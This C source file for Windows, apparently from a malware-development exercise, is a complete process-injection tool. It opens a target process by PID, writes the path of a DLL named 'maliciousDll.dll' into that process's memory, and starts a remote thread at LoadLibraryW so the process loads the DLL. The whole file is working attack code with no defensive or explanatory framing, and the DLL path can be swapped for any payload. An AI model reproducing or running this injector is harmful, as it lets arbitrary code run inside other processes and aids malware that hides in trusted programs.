#include <stdio.h>
#include <windows.h>

const char* k = "[+]";
const char* e = "[-]";
const char* i = "[*]";

DWORD PID, TID = NULL;
LPVOID rBuffer = NULL;
HMODULE hKernel32 = NULL;
HANDLE hProcess, hThread = NULL;

wchar_t dllPath[MAX_PATH] = L"C:\\Users\\dev\\Desktop\\malwaredev\\maliciousDll.dll";
size_t dllPathSize = sizeof(dllPath);


int main(int argc, char* argv[]) {
	
	if (argc < 2) {
		printf("%s usage: %s", e, argv[0]);
		return EXIT_FAILURE;
	}

	PID = atoi(argv[1]);

	printf("%s trying to get a handle to the process (%ld)\n", i, PID);

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

	if (hProcess == NULL) {
		printf("%s failed to get a handle to the process, error: %ld\n", e, GetLastError());
		return EXIT_FAILURE;
	}

	printf("%s got a handle to the process (%ld)\n\\--0x%p\n", k, PID, hProcess);

	rBuffer = VirtualAllocEx(hProcess, NULL, dllPathSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
	printf("%s allocated buffer to process memory w/ PAGE_READWRITE permissions\n", k);

	if (rBuffer == NULL) {
		printf("%s couldn't create rBuffer, error: %ld\n", e, GetLastError());
		return EXIT_FAILURE;
	}

	/* write DLL path to the process memory */
	WriteProcessMemory(hProcess, rBuffer, dllPath, dllPathSize, NULL);
	printf("%s wrote [%S] to process memory\n", k, dllPath);

	hKernel32 = GetModuleHandleW(L"Kernel32");

	if (hKernel32 == NULL) {
		printf("%s failed to get a handle to Kernel32.dll, error: %ld\n", e, GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}

	printf("%s got a handle to Kernel32.dll\n\\---0x%p\n", k, hKernel32);

	LPTHREAD_START_ROUTINE startThis = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
	printf("%s got the address of LoadLibraryW()\n\\---0x%p\n", k, startThis);

	hThread = CreateRemoteThread(hProcess, NULL, 0, startThis, rBuffer, 0, &TID);
	if (hThread == NULL) {
		printf("%s failed to get a handle to thread, error: %ld\n", e, GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}

	printf("%s got handle to the newly-created thread (%ld)\n\\---0x%p\n", k, TID, hThread);
	printf("%s waiting for the thread to finish execution\n", i);

	WaitForSingleObject(hThread, INFINITE); // Thread finishes when we click OK in the MessageBox
	printf("%s thread finished executing, cleaning up...\n", k);

	CloseHandle(hThread);
	CloseHandle(hProcess);

	return EXIT_SUCCESS;
}